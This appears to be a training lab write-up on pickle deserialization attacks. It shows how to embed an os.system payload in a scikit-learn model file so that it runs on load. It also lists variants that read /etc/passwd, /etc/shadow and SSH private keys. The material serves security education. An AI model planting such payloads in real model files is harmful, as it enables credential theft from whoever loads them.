---
description: >-
  Creating Trojanized Models
title: Creating Trojanized Models  # Add title here
date: 2025-11-29 08:00:00 -0600                           # Change the date to match completion date
categories: [23 AI and ML attack, 04 Threat Modeling]                     # Change Templates to Writeup
tags: [AI, Trojanized Models]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

#### Introduction
The lab is not about creating a super helpful model or a chatbot, but understanding how to embed executable code inside a model.

#### Requirements
```bash
mkdir trojan-model
cd trojan-model
apt update && apt install python3-pip -y
cat>requirements.txt<<EOF
scikit-learn==1.6.1
numpy==2.0.2
scipy==1.15.1
joblib==1.4.2
EOF
pip install -r requirements.txt
```

#### Building a Simple Vector Based Model
```bash
cat>train_model.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]
# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)
# Bundle vectorizer, classifier
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf
}

# Save model with embedded payload
with open("model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained model.pkl")
EOF
```

#### Building a Program To Consume the Model

```bash
cat>consume_model.py<<EOF
import pickle

# Load the model
with open("model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# ML inference
vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

#### Traing and Build the model

```bash
python3 train_model.py
```

#### Consuming the Model
```bash
python3 consume_model.py

# Examples
Ask a question: Define GPU
```

#### Building Executable Code in Models

The pickle file used for serializing model data is notoriously known to be a security risk because it can execute arbitrary code.

In the previous step, the code that was responsible for saving the model data in to a pickle is shown below:
```python
# Bundle vectorizer, classifier
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf
}

# Save model with embedded payload
with open("model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained model.pkl")
```
We are going to modify this code to include a proof of concept executable code.

1) We will try and read the contents of the /etc/passwd file, and print the contents.
2) After the model training, we will save executable code in to the model file.
3) When the model is consumed, the executable code will be executed, automatically.
```python
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))


# Bundle vectorizer, classifier, and payload
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()  # This runs on load the pickle file
}

# Save model with embedded payload
with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained and trojanized as trojan_model.pkl")
```
#### Writing Code To Inject Executable Code In To The Model
You can download the completed code from the following link.

```bash
wget -O train-model-with-trojan.py https://gitlab.practical-devsecops.training/-/snippets/80/raw/main/train-model-with-trojan.py
```

Or, you can copy and paste the code below.
```python
cat>train-model-with-trojan.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# Extract prompts and responses
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# Vectorizer and model
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# Executable code
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))


# Bundle vectorizer, classifier, and payload
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()  # Runs when the model is loaded
}

# Save model with embedded payload
with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Model trained and trojanized as trojan_model.pkl")
EOF
```
Then, go ahead and execute the train-model-with-trojan.py file.

```bash
python3 train-model-with-trojan.py
```
You should see the below output.

Command Output
```bash
[✔] Model trained and trojanized as trojan_model.pkl
```
If you do an ls -al, you should see the trojan_model.pkl file.

#### Loading the Model with Executable Code
The model consumer code does not need many changes, but only the name of the model file needs to be changed, as we now need to test the trojan_model.pkl file.

Copy and paste the below code to create the consume_model.py file reading the trojan_model.pkl file.

```bash
cat>consume_model.py<<EOF
import pickle

# Load the model
with open("trojan_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# ML inference
vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```
Now, go ahead and execute the consume_model.py file.

```bash
python3 consume_model.py
```
And you should see the below output containing the contents of the /etc/passwd file. And then, as usual the program asking you for a question.

Command Output:
```bash
~/trojan-model# python3 consume_model.py
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nvidia-persistenced:x:115:122:NVIDIA Persistence Daemon,,,:/nonexistent:/usr/sbin/nologin
ollama:x:998:998::/usr/share/ollama:/bin/false
Ask a question: What is AI
Response: AI stands for Artificial Intelligence.
~/trojan-model#
```

From now on, every time someone consumes the model, the model will execute executable code, and print the contents of the /etc/passwd file in the system, where the model is loaded.

#### Weaponizing Trojanized Models

```bash
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/authorized_keys'",))

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat ~/.ssh/id_rsa'",))

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/shadow'",))
```

